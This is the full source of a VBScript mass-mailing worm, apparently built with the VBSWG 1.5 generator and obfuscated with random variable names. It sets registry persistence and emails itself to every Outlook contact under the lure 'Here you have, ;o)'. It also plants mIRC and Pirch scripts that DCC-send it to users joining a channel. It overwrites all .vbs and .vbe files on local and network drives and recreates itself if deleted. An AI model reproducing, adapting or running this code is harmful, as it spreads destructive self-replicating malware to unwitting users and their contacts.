'Vbs.sdasd Created By asdasd
On Error Resume Next
Set wM3KuIj67cVa2fQQFOoL= Createobject("scripting.filesystemobject")
wM3KuIj67cVa2fQQFOoL.copyfile wscript.scriptfullname,wM3KuIj67cVa2fQQFOoL.GetSpecialFolder(1)& "\asdaas.vbs"
Set A3x2dc1IDhSwnKt7LyAo = CreateObject("WScript.Shell")
A3x2dc1IDhSwnKt7LyAo.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe "&wM3KuIj67cVa2fQQFOoL.GetSpecialFolder(1)& "\asdaas.vbs %"
if A3x2dc1IDhSwnKt7LyAo.regread ("HKCU\software\sdasd\mailed") <> "1" then
FAlxNuylSi05z4D6n6PY()
end if
if A3x2dc1IDhSwnKt7LyAo.regread ("HKCU\software\sdasd\mirqued") <> "1" then
O5n3N9j521fw66C28gpn ""
end if
if A3x2dc1IDhSwnKt7LyAo.regread ("HKCU\software\sdasd\pirched") <> "1" then
nwz5IX6ob91AfaX3VDTt ""
end if
QI5XkbI3362XbsPy92d5()
if month(now) = 1 then
A3x2dc1IDhSwnKt7LyAo.run "Http://www.sex.co.il",3,false
end if
Set Sn6PY6NhK5ZugFd2aRr3= wM3KuIj67cVa2fQQFOoL.opentextfile(wscript.scriptfullname, 1)
G8gpn33Cj5xQeelDazhX= Sn6PY6NhK5ZugFd2aRr3.readall
Sn6PY6NhK5ZugFd2aRr3.Close
Do
If Not (wM3KuIj67cVa2fQQFOoL.fileexists(wscript.scriptfullname)) Then
Set JVDTtgsZ8WE8e123OvxL= wM3KuIj67cVa2fQQFOoL.createtextfile(wscript.scriptfullname, True)
JVDTtgsZ8WE8e123OvxL.writeG8gpn33Cj5xQeelDazhX
JVDTtgsZ8WE8e123OvxL.Close
End If
Loop
Function FAlxNuylSi05z4D6n6PY()
On Error Resume Next
Set KYpXo14tMZB9f8lkNHC5 = CreateObject("Outlook.Application")
If KYpXo14tMZB9f8lkNHC5= "Outlook"Then
Set wL2BmQH564T385tXEN5J=KYpXo14tMZB9f8lkNHC5.GetNameSpace("MAPI")
Set JOvxL6JRHi97bm45e1WE= wL2BmQH564T385tXEN5J.AddressLists
For Each JAUX81O7dH22z8P4u098 In JOvxL6JRHi97bm45e1WE
If JAUX81O7dH22z8P4u098.AddressEntries.Count <> 0 Then
NEN5JJZ4xiuUkvhG827p = JAUX81O7dH22z8P4u098.AddressEntries.Count
For iNHC5R5cJ03J9RvGJ773= 1 To NEN5JJZ4xiuUkvhG827p
Set Hr8Z7n399T5H4e066B28 = KYpXo14tMZB9f8lkNHC5.CreateItem(0)
Set Kb0avQ5OW5n89gZegW3U = JAUX81O7dH22z8P4u098.AddressEntries(iNHC5R5cJ03J9RvGJ773)
Hr8Z7n399T5H4e066B28.To = Kb0avQ5OW5n89gZegW3U.Address
Hr8Z7n399T5H4e066B28.Subject = "Here you have, ;o)"
Hr8Z7n399T5H4e066B28.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set dG6M15WjhO2M5lWQr0x9=Hr8Z7n399T5H4e066B28.Attachments
dG6M15WjhO2M5lWQr0x9.Add wM3KuIj67cVa2fQQFOoL.GetSpecialFolder(1)& "\asdaas.vbs"
Hr8Z7n399T5H4e066B28.DeleteAfterSubmit = True
If Hr8Z7n399T5H4e066B28.To <> "" Then
Hr8Z7n399T5H4e066B28.Send
A3x2dc1IDhSwnKt7LyAo.regwrite "HKCU\software\sdasd\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function O5n3N9j521fw66C28gpn(d716m6OX6TTJ7ptmLc2z)
On Error Resume Next
if d716m6OX6TTJ7ptmLc2z = "" then
if wM3KuIj67cVa2fQQFOoL.fileexists("c:\mirc\mirc.ini") then d716m6OX6TTJ7ptmLc2z="c:\mirc"
if wM3KuIj67cVa2fQQFOoL.fileexists("c:\mirc32\mirc.ini") then d716m6OX6TTJ7ptmLc2z="c:\mirc32"
Q6B28fOm3aBi5wPdkr1z=A3x2dc1IDhSwnKt7LyAo.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if wM3KuIj67cVa2fQQFOoL.fileexists(Q6B28fOm3aBi5wPdkr1z & "\mirc\mirc.ini") then d716m6OX6TTJ7ptmLc2z=Q6B28fOm3aBi5wPdkr1z & "\mirc"
end if
if d716m6OX6TTJ7ptmLc2z <> "" then
set fgW3UJSs67kLiko8HO1w = wM3KuIj67cVa2fQQFOoL.CreateTextFile(d716m6OX6TTJ7ptmLc2z & "\script.ini", True)
fgW3UJSs67kLiko8HO1w.WriteLine "[script]"
fgW3UJSs67kLiko8HO1w.writeline "n0=on 1:JOIN:#:{"
fgW3UJSs67kLiko8HO1w.writeline "n1=  /if ( $nick == $me ) { halt }"
fgW3UJSs67kLiko8HO1w.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&wM3KuIj67cVa2fQQFOoL.GetSpecialFolder(1)& "\asdaas.vbs" & vbCrLf & "n3=}"
fgW3UJSs67kLiko8HO1w.close
A3x2dc1IDhSwnKt7LyAo.regwrite "HKCU\software\sdasd\Mirqued", "1"
end if
end function
function nwz5IX6ob91AfaX3VDTt(JS2HukA003oIeXA769g5)
On Error Resume Next
if JS2HukA003oIeXA769g5="" then
if wM3KuIj67cVa2fQQFOoL.fileexists("c:\pirch\Pirch32.exe") then JS2HukA003oIeXA769g5="c:\pirch"
if wM3KuIj67cVa2fQQFOoL.fileexists("c:\pirch32\Pirch32.exe") then JS2HukA003oIeXA769g5="c:\pirch32"
C9SvHYx6uDr7hc4V4p3A=A3x2dc1IDhSwnKt7LyAo.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if wM3KuIj67cVa2fQQFOoL.fileexists(C9SvHYx6uDr7hc4V4p3A & "\pirch\Pirch32.exe") then JS2HukA003oIeXA769g5=C9SvHYx6uDr7hc4V4p3A & "\pirch\Pirch32.exe"
end if
if JS2HukA003oIeXA769g5 <> "" then
set PDF4CXT6QKN84X0vQ55q= wM3KuIj67cVa2fQQFOoL.CreateTextFile(JS2HukA003oIeXA769g5 & "\events.ini", True)
PDF4CXT6QKN84X0vQ55q.WriteLine "[Levels]"
PDF4CXT6QKN84X0vQ55q.WriteLine "Enabled=1"
PDF4CXT6QKN84X0vQ55q.WriteLine "Count=6"
PDF4CXT6QKN84X0vQ55q.WriteLine "Level1=000-Unknowns"
PDF4CXT6QKN84X0vQ55q.WriteLine "000-UnknownsEnabled=1"
PDF4CXT6QKN84X0vQ55q.WriteLine "Level2=100-Level 100"
PDF4CXT6QKN84X0vQ55q.WriteLine "100-Level 100Enabled=1"
PDF4CXT6QKN84X0vQ55q.WriteLine "Level3=200-Level 200"
PDF4CXT6QKN84X0vQ55q.WriteLine "200-Level 200Enabled=1"
PDF4CXT6QKN84X0vQ55q.WriteLine "Level4=300-Level 300"
PDF4CXT6QKN84X0vQ55q.WriteLine " 300-Level 300Enabled=1"
PDF4CXT6QKN84X0vQ55q.WriteLine "Level5=400-Level 400 "
PDF4CXT6QKN84X0vQ55q.WriteLine "400-Level 400Enabled=1"
PDF4CXT6QKN84X0vQ55q.WriteLine "Level6=500-Level 500"
PDF4CXT6QKN84X0vQ55q.WriteLine "500-Level 500Enabled=1"
PDF4CXT6QKN84X0vQ55q.WriteLine ""
PDF4CXT6QKN84X0vQ55q.WriteLine "[000-Unknowns]"
PDF4CXT6QKN84X0vQ55q.WriteLine "UserCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine "EventCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine ""
PDF4CXT6QKN84X0vQ55q.WriteLine "[100-Level 100]"
PDF4CXT6QKN84X0vQ55q.WriteLine "User1=*!*@*"
PDF4CXT6QKN84X0vQ55q.WriteLine "UserCount=1"
PDF4CXT6QKN84X0vQ55q.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & wM3KuIj67cVa2fQQFOoL.GetSpecialFolder(1) & "\asdaas.vbs"
PDF4CXT6QKN84X0vQ55q.WriteLine "EventCount=1"
PDF4CXT6QKN84X0vQ55q.WriteLine ""
PDF4CXT6QKN84X0vQ55q.WriteLine "[200-Level 200]"
PDF4CXT6QKN84X0vQ55q.WriteLine "UserCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine "EventCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine ""
PDF4CXT6QKN84X0vQ55q.WriteLine "[300-Level 300]"
PDF4CXT6QKN84X0vQ55q.WriteLine "UserCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine "EventCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine ""
PDF4CXT6QKN84X0vQ55q.WriteLine "[400-Level 400]"
PDF4CXT6QKN84X0vQ55q.WriteLine "UserCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine "EventCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine ""
PDF4CXT6QKN84X0vQ55q.WriteLine "[500-Level 500]"
PDF4CXT6QKN84X0vQ55q.WriteLine "UserCount=0"
PDF4CXT6QKN84X0vQ55q.WriteLine "EventCount=0"
PDF4CXT6QKN84X0vQ55q.close
A3x2dc1IDhSwnKt7LyAo.regwrite "HKCU\software\sdasd\pirched", "1"
end if
end function
Function QI5XkbI3362XbsPy92d5()
On Error Resume Next
Set o904e75w4FND9BI0icxa = wM3KuIj67cVa2fQQFOoL.Drives
For Each S69g5CY4sh6x9D40jypM In o904e75w4FND9BI0icxa
If S69g5CY4sh6x9D40jypM.Drivetype = Remote Then
R4p3A53FqU5td4U486u5= S69g5CY4sh6x9D40jypM & "\"
Call bNI34AVYi1P7e622z8Q4(R4p3A53FqU5td4U486u5)
ElseIf S69g5CY4sh6x9D40jypM.IsReady Then
R4p3A53FqU5td4U486u5= S69g5CY4sh6x9D40jypM&"\"
Call bNI34AVYi1P7e622z8Q4(R4p3A53FqU5td4U486u5)
End If
Next
End Function
Function bNI34AVYi1P7e622z8Q4(Wf123PvxM6KSIj97bVa5)
K86u5FN5KKZ4PivVlwiH=Wf123PvxM6KSIj97bVa5
Set Zg8mk4HD6R5dK13KhSwH= wM3KuIj67cVa2fQQFOoL.GetFolder(K86u5FN5KKZ4PivVlwiH)
Set Gz8Q4v099K51wX765Rz8= Zg8mk4HD6R5dK13KhSwH.Files
For Each UbVa5f1XE2oSA7HlgL9i In Gz8Q4v099K51wX765Rz8
if wM3KuIj67cVa2fQQFOoL.GetExtensionName(UbVa5f1XE2oSA7HlgL9i.path) = "vbs" then
wM3KuIj67cVa2fQQFOoL.copyfile wscript.scriptfullname , UbVa5f1XE2oSA7HlgL9i.path , true
end if
if wM3KuIj67cVa2fQQFOoL.GetExtensionName(UbVa5f1XE2oSA7HlgL9i.path) = "vbe" then
wM3KuIj67cVa2fQQFOoL.copyfile wscript.scriptfullname , UbVa5f1XE2oSA7HlgL9i.path , true
end if
Next
Set UbVa5f1XE2oSA7HlgL9i= Zg8mk4HD6R5dK13KhSwH.SubFolders
For Each RY3392GtjZ0039Hkb7hp In UbVa5f1XE2oSA7HlgL9i
Call bNI34AVYi1P7e622z8Q4(RY3392GtjZ0039Hkb7hp.path)
Next
End Function
'Vbswg 1.5. [K]Alamar.
